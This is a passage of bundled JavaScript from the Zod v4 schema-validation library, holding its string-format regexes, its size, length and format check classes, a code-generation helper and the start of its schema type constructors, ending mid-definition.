var email = /^(?!\.)(?!.*\.\.)([A-Za-z0-9_'+\-\.]*)[A-Za-z0-9_+-]@([A-Za-z0-9][A-Za-z0-9\-]*\.)+[A-Za-z]{2,}$/;
var html5Email = /^[a-zA-Z0-9.!#$%&'*+/=?^_`{|}~-]+@[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?(?:\.[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?)*$/;
var rfc5322Email = /^(([^<>()\[\]\\.,;:\s@"]+(\.[^<>()\[\]\\.,;:\s@"]+)*)|(".+"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/;
var unicodeEmail = /^[^\s@"]{1,64}@[^\s@]{1,255}$/u;
var idnEmail = unicodeEmail;
var browserEmail = /^[a-zA-Z0-9.!#$%&'*+/=?^_`{|}~-]+@[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?(?:\.[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?)*$/;
var _emoji = `^(\\p{Extended_Pictographic}|\\p{Emoji_Component})+$`;
function emoji() {
  return new RegExp(_emoji, "u");
}
var ipv4 = /^(?:(?:25[0-5]|2[0-4][0-9]|1[0-9][0-9]|[1-9][0-9]|[0-9])\.){3}(?:25[0-5]|2[0-4][0-9]|1[0-9][0-9]|[1-9][0-9]|[0-9])$/;
var ipv6 = /^(([0-9a-fA-F]{1,4}:){7}[0-9a-fA-F]{1,4}|([0-9a-fA-F]{1,4}:){1,7}:|([0-9a-fA-F]{1,4}:){1,6}:[0-9a-fA-F]{1,4}|([0-9a-fA-F]{1,4}:){1,5}(:[0-9a-fA-F]{1,4}){1,2}|([0-9a-fA-F]{1,4}:){1,4}(:[0-9a-fA-F]{1,4}){1,3}|([0-9a-fA-F]{1,4}:){1,3}(:[0-9a-fA-F]{1,4}){1,4}|([0-9a-fA-F]{1,4}:){1,2}(:[0-9a-fA-F]{1,4}){1,5}|[0-9a-fA-F]{1,4}:((:[0-9a-fA-F]{1,4}){1,6})|:((:[0-9a-fA-F]{1,4}){1,7}|:))$/;
var mac = (delimiter) => {
  const escapedDelim = escapeRegex(delimiter ?? ":");
  return new RegExp(`^(?:[0-9A-F]{2}${escapedDelim}){5}[0-9A-F]{2}$|^(?:[0-9a-f]{2}${escapedDelim}){5}[0-9a-f]{2}$`);
};
var cidrv4 = /^((25[0-5]|2[0-4][0-9]|1[0-9][0-9]|[1-9][0-9]|[0-9])\.){3}(25[0-5]|2[0-4][0-9]|1[0-9][0-9]|[1-9][0-9]|[0-9])\/([0-9]|[1-2][0-9]|3[0-2])$/;
var cidrv6 = /^(([0-9a-fA-F]{1,4}:){7}[0-9a-fA-F]{1,4}|::|([0-9a-fA-F]{1,4})?::([0-9a-fA-F]{1,4}:?){0,6})\/(12[0-8]|1[01][0-9]|[1-9]?[0-9])$/;
var base64 = /^$|^(?:[0-9a-zA-Z+/]{4})*(?:(?:[0-9a-zA-Z+/]{2}==)|(?:[0-9a-zA-Z+/]{3}=))?$/;
var base64url = /^[A-Za-z0-9_-]*$/;
var hostname = /^(?=.{1,253}\.?$)[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?(?:\.[a-zA-Z0-9](?:[-0-9a-zA-Z]{0,61}[0-9a-zA-Z])?)*\.?$/;
var domain = /^([a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?\.)+[a-zA-Z]{2,}$/;
var e164 = /^\+[1-9]\d{6,14}$/;
var dateSource = `(?:(?:\\d\\d[2468][048]|\\d\\d[13579][26]|\\d\\d0[48]|[02468][048]00|[13579][26]00)-02-29|\\d{4}-(?:(?:0[13578]|1[02])-(?:0[1-9]|[12]\\d|3[01])|(?:0[469]|11)-(?:0[1-9]|[12]\\d|30)|(?:02)-(?:0[1-9]|1\\d|2[0-8])))`;
var date = /* @__PURE__ */ new RegExp(`^${dateSource}$`);
function timeSource(args) {
  const hhmm = `(?:[01]\\d|2[0-3]):[0-5]\\d`;
  const regex = typeof args.precision === "number" ? args.precision === -1 ? `${hhmm}` : args.precision === 0 ? `${hhmm}:[0-5]\\d` : `${hhmm}:[0-5]\\d\\.\\d{${args.precision}}` : `${hhmm}(?::[0-5]\\d(?:\\.\\d+)?)?`;
  return regex;
}
function time(args) {
  return new RegExp(`^${timeSource(args)}$`);
}
function datetime(args) {
  const time2 = timeSource({ precision: args.precision });
  const opts = ["Z"];
  if (args.local)
    opts.push("");
  if (args.offset)
    opts.push(`([+-](?:[01]\\d|2[0-3]):[0-5]\\d)`);
  const timeRegex = `${time2}(?:${opts.join("|")})`;
  return new RegExp(`^${dateSource}T(?:${timeRegex})$`);
}
var string = (params) => {
  const regex = params ? `[\\s\\S]{${params?.minimum ?? 0},${params?.maximum ?? ""}}` : `[\\s\\S]*`;
  return new RegExp(`^${regex}$`);
};
var bigint = /^-?\d+n?$/;
var integer = /^-?\d+$/;
var number = /^-?\d+(?:\.\d+)?$/;
var boolean = /^(?:true|false)$/i;
var _null = /^null$/i;
var _undefined = /^undefined$/i;
var lowercase = /^[^A-Z]*$/;
var uppercase = /^[^a-z]*$/;
var hex = /^[0-9a-fA-F]*$/;
function fixedBase64(bodyLength, padding) {
  return new RegExp(`^[A-Za-z0-9+/]{${bodyLength}}${padding}$`);
}
function fixedBase64url(length) {
  return new RegExp(`^[A-Za-z0-9_-]{${length}}$`);
}
var md5_hex = /^[0-9a-fA-F]{32}$/;
var md5_base64 = /* @__PURE__ */ fixedBase64(22, "==");
var md5_base64url = /* @__PURE__ */ fixedBase64url(22);
var sha1_hex = /^[0-9a-fA-F]{40}$/;
var sha1_base64 = /* @__PURE__ */ fixedBase64(27, "=");
var sha1_base64url = /* @__PURE__ */ fixedBase64url(27);
var sha256_hex = /^[0-9a-fA-F]{64}$/;
var sha256_base64 = /* @__PURE__ */ fixedBase64(43, "=");
var sha256_base64url = /* @__PURE__ */ fixedBase64url(43);
var sha384_hex = /^[0-9a-fA-F]{96}$/;
var sha384_base64 = /* @__PURE__ */ fixedBase64(64, "");
var sha384_base64url = /* @__PURE__ */ fixedBase64url(64);
var sha512_hex = /^[0-9a-fA-F]{128}$/;
var sha512_base64 = /* @__PURE__ */ fixedBase64(86, "==");
var sha512_base64url = /* @__PURE__ */ fixedBase64url(86);

// node_modules/zod/v4/core/checks.js
var $ZodCheck = /* @__PURE__ */ $constructor("$ZodCheck", (inst, def) => {
  var _a;
  inst._zod ?? (inst._zod = {});
  inst._zod.def = def;
  (_a = inst._zod).onattach ?? (_a.onattach = []);
});
var numericOriginMap = {
  number: "number",
  bigint: "bigint",
  object: "date"
};
var $ZodCheckLessThan = /* @__PURE__ */ $constructor("$ZodCheckLessThan", (inst, def) => {
  $ZodCheck.init(inst, def);
  const origin = numericOriginMap[typeof def.value];
  inst._zod.onattach.push((inst2) => {
    const bag = inst2._zod.bag;
    const curr = (def.inclusive ? bag.maximum : bag.exclusiveMaximum) ?? Number.POSITIVE_INFINITY;
    if (def.value < curr) {
      if (def.inclusive)
        bag.maximum = def.value;
      else
        bag.exclusiveMaximum = def.value;
    }
  });
  inst._zod.check = (payload) => {
    if (def.inclusive ? payload.value <= def.value : payload.value < def.value) {
      return;
    }
    payload.issues.push({
      origin,
      code: "too_big",
      maximum: typeof def.value === "object" ? def.value.getTime() : def.value,
      input: payload.value,
      inclusive: def.inclusive,
      inst,
      continue: !def.abort
    });
  };
});
var $ZodCheckGreaterThan = /* @__PURE__ */ $constructor("$ZodCheckGreaterThan", (inst, def) => {
  $ZodCheck.init(inst, def);
  const origin = numericOriginMap[typeof def.value];
  inst._zod.onattach.push((inst2) => {
    const bag = inst2._zod.bag;
    const curr = (def.inclusive ? bag.minimum : bag.exclusiveMinimum) ?? Number.NEGATIVE_INFINITY;
    if (def.value > curr) {
      if (def.inclusive)
        bag.minimum = def.value;
      else
        bag.exclusiveMinimum = def.value;
    }
  });
  inst._zod.check = (payload) => {
    if (def.inclusive ? payload.value >= def.value : payload.value > def.value) {
      return;
    }
    payload.issues.push({
      origin,
      code: "too_small",
      minimum: typeof def.value === "object" ? def.value.getTime() : def.value,
      input: payload.value,
      inclusive: def.inclusive,
      inst,
      continue: !def.abort
    });
  };
});
var $ZodCheckMultipleOf = /* @__PURE__ */ $constructor("$ZodCheckMultipleOf", (inst, def) => {
  $ZodCheck.init(inst, def);
  inst._zod.onattach.push((inst2) => {
    var _a;
    (_a = inst2._zod.bag).multipleOf ?? (_a.multipleOf = def.value);
  });
  inst._zod.check = (payload) => {
    if (typeof payload.value !== typeof def.value)
      throw new Error("Cannot mix number and bigint in multiple_of check.");
    const isMultiple = typeof payload.value === "bigint" ? payload.value % def.value === BigInt(0) : floatSafeRemainder(payload.value, def.value) === 0;
    if (isMultiple)
      return;
    payload.issues.push({
      origin: typeof payload.value,
      code: "not_multiple_of",
      divisor: def.value,
      input: payload.value,
      inst,
      continue: !def.abort
    });
  };
});
var $ZodCheckNumberFormat = /* @__PURE__ */ $constructor("$ZodCheckNumberFormat", (inst, def) => {
  $ZodCheck.init(inst, def);
  def.format = def.format || "float64";
  const isInt = def.format?.includes("int");
  const origin = isInt ? "int" : "number";
  const [minimum, maximum] = NUMBER_FORMAT_RANGES[def.format];
  inst._zod.onattach.push((inst2) => {
    const bag = inst2._zod.bag;
    bag.format = def.format;
    bag.minimum = minimum;
    bag.maximum = maximum;
    if (isInt)
      bag.pattern = integer;
  });
  inst._zod.check = (payload) => {
    const input = payload.value;
    if (isInt) {
      if (!Number.isInteger(input)) {
        payload.issues.push({
          expected: origin,
          format: def.format,
          code: "invalid_type",
          continue: false,
          input,
          inst
        });
        return;
      }
      if (!Number.isSafeInteger(input)) {
        if (input > 0) {
          payload.issues.push({
            input,
            code: "too_big",
            maximum: Number.MAX_SAFE_INTEGER,
            note: "Integers must be within the safe integer range.",
            inst,
            origin,
            inclusive: true,
            continue: !def.abort
          });
        } else {
          payload.issues.push({
            input,
            code: "too_small",
            minimum: Number.MIN_SAFE_INTEGER,
            note: "Integers must be within the safe integer range.",
            inst,
            origin,
            inclusive: true,
            continue: !def.abort
          });
        }
        return;
      }
    }
    if (input < minimum) {
      payload.issues.push({
        origin: "number",
        input,
        code: "too_small",
        minimum,
        inclusive: true,
        inst,
        continue: !def.abort
      });
    }
    if (input > maximum) {
      payload.issues.push({
        origin: "number",
        input,
        code: "too_big",
        maximum,
        inclusive: true,
        inst,
        continue: !def.abort
      });
    }
  };
});
var $ZodCheckBigIntFormat = /* @__PURE__ */ $constructor("$ZodCheckBigIntFormat", (inst, def) => {
  $ZodCheck.init(inst, def);
  const [minimum, maximum] = BIGINT_FORMAT_RANGES[def.format];
  inst._zod.onattach.push((inst2) => {
    const bag = inst2._zod.bag;
    bag.format = def.format;
    bag.minimum = minimum;
    bag.maximum = maximum;
  });
  inst._zod.check = (payload) => {
    const input = payload.value;
    if (input < minimum) {
      payload.issues.push({
        origin: "bigint",
        input,
        code: "too_small",
        minimum,
        inclusive: true,
        inst,
        continue: !def.abort
      });
    }
    if (input > maximum) {
      payload.issues.push({
        origin: "bigint",
        input,
        code: "too_big",
        maximum,
        inclusive: true,
        inst,
        continue: !def.abort
      });
    }
  };
});
var $ZodCheckMaxSize = /* @__PURE__ */ $constructor("$ZodCheckMaxSize", (inst, def) => {
  var _a;
  $ZodCheck.init(inst, def);
  (_a = inst._zod.def).when ?? (_a.when = (payload) => {
    const val = payload.value;
    return !nullish(val) && val.size !== undefined;
  });
  inst._zod.onattach.push((inst2) => {
    const curr = inst2._zod.bag.maximum ?? Number.POSITIVE_INFINITY;
    if (def.maximum < curr)
      inst2._zod.bag.maximum = def.maximum;
  });
  inst._zod.check = (payload) => {
    const input = payload.value;
    const size = input.size;
    if (size <= def.maximum)
      return;
    payload.issues.push({
      origin: getSizableOrigin(input),
      code: "too_big",
      maximum: def.maximum,
      inclusive: true,
      input,
      inst,
      continue: !def.abort
    });
  };
});
var $ZodCheckMinSize = /* @__PURE__ */ $constructor("$ZodCheckMinSize", (inst, def) => {
  var _a;
  $ZodCheck.init(inst, def);
  (_a = inst._zod.def).when ?? (_a.when = (payload) => {
    const val = payload.value;
    return !nullish(val) && val.size !== undefined;
  });
  inst._zod.onattach.push((inst2) => {
    const curr = inst2._zod.bag.minimum ?? Number.NEGATIVE_INFINITY;
    if (def.minimum > curr)
      inst2._zod.bag.minimum = def.minimum;
  });
  inst._zod.check = (payload) => {
    const input = payload.value;
    const size = input.size;
    if (size >= def.minimum)
      return;
    payload.issues.push({
      origin: getSizableOrigin(input),
      code: "too_small",
      minimum: def.minimum,
      inclusive: true,
      input,
      inst,
      continue: !def.abort
    });
  };
});
var $ZodCheckSizeEquals = /* @__PURE__ */ $constructor("$ZodCheckSizeEquals", (inst, def) => {
  var _a;
  $ZodCheck.init(inst, def);
  (_a = inst._zod.def).when ?? (_a.when = (payload) => {
    const val = payload.value;
    return !nullish(val) && val.size !== undefined;
  });
  inst._zod.onattach.push((inst2) => {
    const bag = inst2._zod.bag;
    bag.minimum = def.size;
    bag.maximum = def.size;
    bag.size = def.size;
  });
  inst._zod.check = (payload) => {
    const input = payload.value;
    const size = input.size;
    if (size === def.size)
      return;
    const tooBig = size > def.size;
    payload.issues.push({
      origin: getSizableOrigin(input),
      ...tooBig ? { code: "too_big", maximum: def.size } : { code: "too_small", minimum: def.size },
      inclusive: true,
      exact: true,
      input: payload.value,
      inst,
      continue: !def.abort
    });
  };
});
var $ZodCheckMaxLength = /* @__PURE__ */ $constructor("$ZodCheckMaxLength", (inst, def) => {
  var _a;
  $ZodCheck.init(inst, def);
  (_a = inst._zod.def).when ?? (_a.when = (payload) => {
    const val = payload.value;
    return !nullish(val) && val.length !== undefined;
  });
  inst._zod.onattach.push((inst2) => {
    const curr = inst2._zod.bag.maximum ?? Number.POSITIVE_INFINITY;
    if (def.maximum < curr)
      inst2._zod.bag.maximum = def.maximum;
  });
  inst._zod.check = (payload) => {
    const input = payload.value;
    const length = input.length;
    if (length <= def.maximum)
      return;
    const origin = getLengthableOrigin(input);
    payload.issues.push({
      origin,
      code: "too_big",
      maximum: def.maximum,
      inclusive: true,
      input,
      inst,
      continue: !def.abort
    });
  };
});
var $ZodCheckMinLength = /* @__PURE__ */ $constructor("$ZodCheckMinLength", (inst, def) => {
  var _a;
  $ZodCheck.init(inst, def);
  (_a = inst._zod.def).when ?? (_a.when = (payload) => {
    const val = payload.value;
    return !nullish(val) && val.length !== undefined;
  });
  inst._zod.onattach.push((inst2) => {
    const curr = inst2._zod.bag.minimum ?? Number.NEGATIVE_INFINITY;
    if (def.minimum > curr)
      inst2._zod.bag.minimum = def.minimum;
  });
  inst._zod.check = (payload) => {
    const input = payload.value;
    const length = input.length;
    if (length >= def.minimum)
      return;
    const origin = getLengthableOrigin(input);
    payload.issues.push({
      origin,
      code: "too_small",
      minimum: def.minimum,
      inclusive: true,
      input,
      inst,
      continue: !def.abort
    });
  };
});
var $ZodCheckLengthEquals = /* @__PURE__ */ $constructor("$ZodCheckLengthEquals", (inst, def) => {
  var _a;
  $ZodCheck.init(inst, def);
  (_a = inst._zod.def).when ?? (_a.when = (payload) => {
    const val = payload.value;
    return !nullish(val) && val.length !== undefined;
  });
  inst._zod.onattach.push((inst2) => {
    const bag = inst2._zod.bag;
    bag.minimum = def.length;
    bag.maximum = def.length;
    bag.length = def.length;
  });
  inst._zod.check = (payload) => {
    const input = payload.value;
    const length = input.length;
    if (length === def.length)
      return;
    const origin = getLengthableOrigin(input);
    const tooBig = length > def.length;
    payload.issues.push({
      origin,
      ...tooBig ? { code: "too_big", maximum: def.length } : { code: "too_small", minimum: def.length },
      inclusive: true,
      exact: true,
      input: payload.value,
      inst,
      continue: !def.abort
    });
  };
});
var $ZodCheckStringFormat = /* @__PURE__ */ $constructor("$ZodCheckStringFormat", (inst, def) => {
  var _a, _b;
  $ZodCheck.init(inst, def);
  inst._zod.onattach.push((inst2) => {
    const bag = inst2._zod.bag;
    bag.format = def.format;
    if (def.pattern) {
      bag.patterns ?? (bag.patterns = new Set);
      bag.patterns.add(def.pattern);
    }
  });
  if (def.pattern)
    (_a = inst._zod).check ?? (_a.check = (payload) => {
      def.pattern.lastIndex = 0;
      if (def.pattern.test(payload.value))
        return;
      payload.issues.push({
        origin: "string",
        code: "invalid_format",
        format: def.format,
        input: payload.value,
        ...def.pattern ? { pattern: def.pattern.toString() } : {},
        inst,
        continue: !def.abort
      });
    });
  else
    (_b = inst._zod).check ?? (_b.check = () => {});
});
var $ZodCheckRegex = /* @__PURE__ */ $constructor("$ZodCheckRegex", (inst, def) => {
  $ZodCheckStringFormat.init(inst, def);
  inst._zod.check = (payload) => {
    def.pattern.lastIndex = 0;
    if (def.pattern.test(payload.value))
      return;
    payload.issues.push({
      origin: "string",
      code: "invalid_format",
      format: "regex",
      input: payload.value,
      pattern: def.pattern.toString(),
      inst,
      continue: !def.abort
    });
  };
});
var $ZodCheckLowerCase = /* @__PURE__ */ $constructor("$ZodCheckLowerCase", (inst, def) => {
  def.pattern ?? (def.pattern = lowercase);
  $ZodCheckStringFormat.init(inst, def);
});
var $ZodCheckUpperCase = /* @__PURE__ */ $constructor("$ZodCheckUpperCase", (inst, def) => {
  def.pattern ?? (def.pattern = uppercase);
  $ZodCheckStringFormat.init(inst, def);
});
var $ZodCheckIncludes = /* @__PURE__ */ $constructor("$ZodCheckIncludes", (inst, def) => {
  $ZodCheck.init(inst, def);
  const escapedRegex = escapeRegex(def.includes);
  const pattern = new RegExp(typeof def.position === "number" ? `^.{${def.position}}${escapedRegex}` : escapedRegex);
  def.pattern = pattern;
  inst._zod.onattach.push((inst2) => {
    const bag = inst2._zod.bag;
    bag.patterns ?? (bag.patterns = new Set);
    bag.patterns.add(pattern);
  });
  inst._zod.check = (payload) => {
    if (payload.value.includes(def.includes, def.position))
      return;
    payload.issues.push({
      origin: "string",
      code: "invalid_format",
      format: "includes",
      includes: def.includes,
      input: payload.value,
      inst,
      continue: !def.abort
    });
  };
});
var $ZodCheckStartsWith = /* @__PURE__ */ $constructor("$ZodCheckStartsWith", (inst, def) => {
  $ZodCheck.init(inst, def);
  const pattern = new RegExp(`^${escapeRegex(def.prefix)}.*`);
  def.pattern ?? (def.pattern = pattern);
  inst._zod.onattach.push((inst2) => {
    const bag = inst2._zod.bag;
    bag.patterns ?? (bag.patterns = new Set);
    bag.patterns.add(pattern);
  });
  inst._zod.check = (payload) => {
    if (payload.value.startsWith(def.prefix))
      return;
    payload.issues.push({
      origin: "string",
      code: "invalid_format",
      format: "starts_with",
      prefix: def.prefix,
      input: payload.value,
      inst,
      continue: !def.abort
    });
  };
});
var $ZodCheckEndsWith = /* @__PURE__ */ $constructor("$ZodCheckEndsWith", (inst, def) => {
  $ZodCheck.init(inst, def);
  const pattern = new RegExp(`.*${escapeRegex(def.suffix)}$`);
  def.pattern ?? (def.pattern = pattern);
  inst._zod.onattach.push((inst2) => {
    const bag = inst2._zod.bag;
    bag.patterns ?? (bag.patterns = new Set);
    bag.patterns.add(pattern);
  });
  inst._zod.check = (payload) => {
    if (payload.value.endsWith(def.suffix))
      return;
    payload.issues.push({
      origin: "string",
      code: "invalid_format",
      format: "ends_with",
      suffix: def.suffix,
      input: payload.value,
      inst,
      continue: !def.abort
    });
  };
});
function handleCheckPropertyResult(result, payload, property) {
  if (result.issues.length) {
    payload.issues.push(...prefixIssues(property, result.issues));
  }
}
var $ZodCheckProperty = /* @__PURE__ */ $constructor("$ZodCheckProperty", (inst, def) => {
  $ZodCheck.init(inst, def);
  inst._zod.check = (payload) => {
    const result = def.schema._zod.run({
      value: payload.value[def.property],
      issues: []
    }, {});
    if (result instanceof Promise) {
      return result.then((result2) => handleCheckPropertyResult(result2, payload, def.property));
    }
    handleCheckPropertyResult(result, payload, def.property);
    return;
  };
});
var $ZodCheckMimeType = /* @__PURE__ */ $constructor("$ZodCheckMimeType", (inst, def) => {
  $ZodCheck.init(inst, def);
  const mimeSet = new Set(def.mime);
  inst._zod.onattach.push((inst2) => {
    inst2._zod.bag.mime = def.mime;
  });
  inst._zod.check = (payload) => {
    if (mimeSet.has(payload.value.type))
      return;
    payload.issues.push({
      code: "invalid_value",
      values: def.mime,
      input: payload.value.type,
      inst,
      continue: !def.abort
    });
  };
});
var $ZodCheckOverwrite = /* @__PURE__ */ $constructor("$ZodCheckOverwrite", (inst, def) => {
  $ZodCheck.init(inst, def);
  inst._zod.check = (payload) => {
    payload.value = def.tx(payload.value);
  };
});

// node_modules/zod/v4/core/doc.js
class Doc {
  constructor(args = []) {
    this.content = [];
    this.indent = 0;
    if (this)
      this.args = args;
  }
  indented(fn) {
    this.indent += 1;
    fn(this);
    this.indent -= 1;
  }
  write(arg) {
    if (typeof arg === "function") {
      arg(this, { execution: "sync" });
      arg(this, { execution: "async" });
      return;
    }
    const content = arg;
    const lines = content.split(`
`).filter((x) => x);
    const minIndent = Math.min(...lines.map((x) => x.length - x.trimStart().length));
    const dedented = lines.map((x) => x.slice(minIndent)).map((x) => " ".repeat(this.indent * 2) + x);
    for (const line of dedented) {
      this.content.push(line);
    }
  }
  compile() {
    const F = Function;
    const args = this?.args;
    const content = this?.content ?? [``];
    const lines = [...content.map((x) => `  ${x}`)];
    return new F(...args, lines.join(`
`));
  }
}

// node_modules/zod/v4/core/versions.js
var version = {
  major: 4,
  minor: 3,
  patch: 6
};

// node_modules/zod/v4/core/schemas.js
var $ZodType = /* @__PURE__ */ $constructor("$ZodType", (inst, def) => {
  var _a;
  inst ?? (inst = {});
  inst._zod.def = def;
  inst._zod.bag = inst._zod.bag || {};
  inst._zod.version = version;
  const checks = [...inst._zod.def.checks ?? []];
  if (inst._zod.traits.has("$ZodCheck")) {
    checks.unshift(inst);
  }
  for (const ch of checks) {
    for (const fn of ch._zod.onattach) {
      fn(inst);
    }
  }
  if (checks.length === 0) {
    (_a = inst._zod).deferred ?? (_a.deferred = []);
    inst._zod.deferred?.push(() => {
      inst._zod.run = inst._zod.parse;
    });
  } else {
    const runChecks = (payload, checks2, ctx) => {
      let isAborted = aborted(payload);
      let asyncResult;
      for (const ch of checks2) {
        if (ch._zod.def.when) {
          const shouldRun = ch._zod.def.when(payload);
          if (!shouldRun)
            continue;
        } else if (isAborted) {
          continue;
        }
        const currLen = payload.issues.length;
        const _ = ch._zod.check(payload);
        if (_ instanceof Promise && ctx?.async === false) {
          throw new $ZodAsyncError;
        }
        if (asyncResult || _ instanceof Promise) {
          asyncResult = (asyncResult ?? Promise.resolve()).then(async () => {
            await _;
            const nextLen = payload.issues.length;
            if (nextLen === currLen)
              return;
            if (!isAborted)
              isAborted = aborted(payload, currLen);
          });
        } else {
          const nextLen = payload.issues.length;
          if (nextLen === currLen)
            continue;
          if (!isAborted)
            isAborted = aborted(payload, currLen);
        }
      }
      if (asyncResult) {
        return asyncResult.then(() => {
          return payload;
        });
      }
      return payload;
    };
    const handleCanaryResult = (canary, payload, ctx) => {
      if (aborted(canary)) {
        canary.aborted = true;
        return canary;
      }
      const checkResult = runChecks(payload, checks, ctx);
      if (checkResult instanceof Promise) {
        if (ctx.async === false)
          throw new $ZodAsyncError;
        return checkResult.then((checkResult2) => inst._zod.parse(checkResult2, ctx));
      }
      return inst._zod.parse(checkResult, ctx);
    };
    inst._zod.run = (payload, ctx) => {
      if (ctx.skipChecks) {
        return inst._zod.parse(payload, ctx);
      }
      if (ctx.direction === "backward") {
        const canary = inst._zod.parse({ value: payload.value, issues: [] }, { ...ctx, skipChecks: true });
        if (canary instanceof Promise) {
          return canary.then((canary2) => {
            return handleCanaryResult(canary2, payload, ctx);
          });
        }
        return handleCanaryResult(canary, payload, ctx);
      }
      const result = inst._zod.parse(payload, ctx);
      if (result instanceof Promise) {
        if (ctx.async === false)
          throw new $ZodAsyncError;
        return result.then((result2) => runChecks(result2, checks, ctx));
      }
      return runChecks(result, checks, ctx);
    };
  }
  defineLazy(inst, "~standard", () => ({
    validate: (value) => {
      try {
        const r = safeParse(inst, value);
        return r.success ? { value: r.data } : { issues: r.error?.issues };
      } catch (_) {
        return safeParseAsync(inst, value).then((r) => r.success ? { value: r.data } : { issues: r.error?.issues });
      }
    },
    vendor: "zod",
    version: 1
  }));
});
var $ZodString = /* @__PURE__ */ $constructor("$ZodString", (inst, def) => {
  $ZodType.init(inst, def);
  inst._zod.pattern = [...inst?._zod.bag?.patterns ?? []].pop() ?? string(inst._zod.bag);
  inst._zod.parse = (payload, _) => {
    if (def.coerce)
      try {
        payload.value = String(payload.value);
      } catch (_2) {}
    if (typeof payload.value === "string")
      return payload;
    payload.issues.push({
      expected: "string",
      code: "invalid_type",
      input: payload.value,
      inst
    });
    return payload;
  };
});
var $ZodStringFormat = /* @__PURE__ */ $constructor("$ZodStringFormat", (inst, def) => {
  $ZodCheckStringFormat.init(inst, def);
  $ZodString.init(inst, def);
});
var $ZodGUID = /* @__PURE__ */ $constructor("$ZodGUID", (inst, def) => {
  def.pattern ?? (def.pattern = guid);
  $ZodStringFormat.init(inst, def);
});
var $ZodUUID = /* @__PURE__ */ $constructor("$ZodUUID", (inst, def) => {
  if (def.version) {
    const versionMap = {
      v1: 1,
      v2: 2,
      v3: 3,
      v4: 4,
      v5: 5,
      v6: 6,
      v7: 7,
      v8: 8
    };
    const v = versionMap[def.version];
    if (v === undefined)
      throw new Error(`Invalid UUID version: "${def.version}"`);
    def.pattern ?? (def.pattern = uuid(v));
  } else
    def.pattern ?? (def.pattern = uuid());
  $ZodStringFormat.init(inst, def);
});
var $ZodEmail = /* @__PURE__ */ $constructor("$ZodEmail", (inst, def) => {
  def.pattern ?? (def.pattern = email);
  $ZodStringFormat.init(inst, def);
});
var $ZodURL = /* @__PURE__ */ $constructor("$ZodURL", (inst, def) => {
  $ZodStringFormat.init(inst, def);
  inst._zod.check = (payload) => {
    try {
      const trimmed = payload.value.trim();
      const url = new URL(trimmed);
      if (def.hostname) {
        def.hostname.lastIndex = 0;
        if (!def.hostname.test(url.hostname)) {
          payload.issues.push({
            code: "invalid_format",
            format: "url",
            note: "Invalid hostname",
            pattern: def.hostname.source,
            input: payload.value,
            inst,
            continue: !def.abort
          });
        }
      }
      if (def.protocol) {
        def.protocol.lastIndex = 0;
        if (!def.protocol.test(url.protocol.endsWith(":") ? url.protocol.slice(0, -1) : url.protocol)) {
          payload.issues.push({
            code: "invalid_format",
            format: "url",
            note: "Invalid protocol",
            pattern: def.protocol.source,
            input: payload.value,
            inst,
            continue: !def.abort
          });
        }
      }
      if (def.normalize) {
        payload.value = url.href;
      } else {
        payload.value = trimmed;
      }
      return;
    } catch (_) {
      payload.issues.push({
        code: "invalid_format",
        format: "url",
        input: payload.value,
        inst,
        continue: !def.abort
      });
    }
  };
});
var $ZodEmoji = /* @__PURE__ */ $constructor("$ZodEmoji", (inst, def) => {
  def.pattern ?? (def.pattern = emoji());
  $ZodStringFormat.init(inst, def);
});
var $ZodNanoID = /* @__PURE__ */ $constructor("$ZodNanoID", (inst, def) => {
  def.pattern ?? (def.pattern = nanoid);
  $ZodStringFormat.init(inst, def);
});
var $ZodCUID = /* @__PURE__ */ $constructor("$ZodCUID", (inst, def) => {
  def.pattern ?? (def.pattern = cuid);
  $ZodStringFormat.init(inst, def);
});
var $ZodCUID2 = /* @__PURE__ */ $constructor("$ZodCUID2", (inst, def) => {
  def.pattern ?? (def.pattern = cuid2);
  $ZodStringFormat.init(inst, def);
});
var $ZodULID = /* @__PURE__ */ $constructor("$ZodULID", (inst, def) => {
  def.pattern ?? (def.pattern = ulid);
  $ZodStringFormat.init(inst, def);
});
var $ZodXID = /* @__PURE__ */ $constructor("$ZodXID", (inst, def) => {
  def.pattern ?? (def.pattern = xid);
  $ZodStringFormat.init(inst, def);
});
var $ZodKSUID = /* @__PURE__ */ $constructor("$ZodKSUID", (inst, def) => {
  def.pattern ?? (def.pattern = ksuid);
  $ZodStringFormat.init(inst, def);
});
var $ZodISODateTime = /* @__PURE__ */ $constructor("$ZodISODateTime", (inst, def) => {
  def.pattern ?? (def.pattern = datetime(def));
  $ZodStringFormat.init(inst, def);
});
var $ZodISODate = /* @__PURE__ */ $constructor("$ZodISODate", (inst, def) => {
  def.pattern ?? (def.pattern = date);
  $ZodStringFormat.init(inst, def);
});
var $ZodISOTime = /* @__PURE__ */ $constructor("$ZodISOTime", (inst, def) => {
  def.pattern ?? (def.pattern = time(def));
  $ZodStringFormat.init(inst, def);
});
var $ZodISODuration = /* @__PURE__ */ $constructor("$ZodISODuration", (inst, def) => {
  def.pattern ?? (def.pattern = duration);
  $ZodStringFormat.init(inst, def);
});
var $ZodIPv4 = /* @__PURE__ */ $constructor("$ZodIPv4", (inst, def) => {
  def.pattern ?? (def.pattern = ipv4);
  $ZodStringFormat.init(inst, def);
  inst._zod.bag.format = `ipv4`;
});
var $ZodIPv6 = /* @__PURE__ */ $constructor("$ZodIPv6", (inst, def) => {
  def.pattern ?? (def.pattern = ipv6);
  $ZodStringFormat.init(inst, def);
  inst._zod.bag.format = `ipv6`;
  inst._zod.check = (payload) => {
    try {
      new URL(`http://[${payload.value}]`);
    } catch {
      payload.issues.push({
        code: "invalid_format",
        format: "ipv6",
        input: payload.value,
        inst,
        continue: !def.abort
      });
    }
  };
});
var $ZodMAC = /* @__PURE__ */ $constructor("$ZodMAC", (inst, def) => {
  def.pattern ?? (def.pattern = mac(def.delimiter));
  $ZodStringFormat.init(inst, def);
  inst._zod.bag.format = `mac`;
});
var $ZodCIDRv4 = /* @__PURE__ */ $constructor("$ZodCIDRv4", (inst, def) => {
